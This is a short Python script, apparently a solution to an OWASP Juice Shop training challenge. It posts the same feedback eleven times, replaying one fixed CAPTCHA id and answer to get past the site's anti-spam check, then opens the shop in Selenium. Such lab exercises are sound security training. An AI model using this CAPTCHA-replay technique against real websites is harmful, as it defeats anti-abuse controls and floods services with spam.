import requests
import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

try:
	driver = webdriver.Chrome()
	
	headers = {
		'Content-Type': 'application/json',
	}
	
	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
	
	# Define the API endpoint URL
	url = f"http://{IP_ADDRESS}:{PORT}/api/Feedbacks"

	# Prepare the JSON payload for the request body
	payload = {"captchaId":1,"captcha":"-33","comment":"dfhsd (anonymous)","rating":2}

	for i in range(11):
		# Send the POST request with the JSON payload
		response = requests.post(url, json=payload, headers=headers)

		# Print the response status code and JSON content
		print(f"Status Code: {response.status_code}")
		print(f"Response Body: {response.json()}")

	driver.get(f"http://{IP_ADDRESS}:{PORT}")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
	input("Press Enter...")

except Exception as e:
    print(f"An error occurred: {e}")

finally:
  driver.quit()
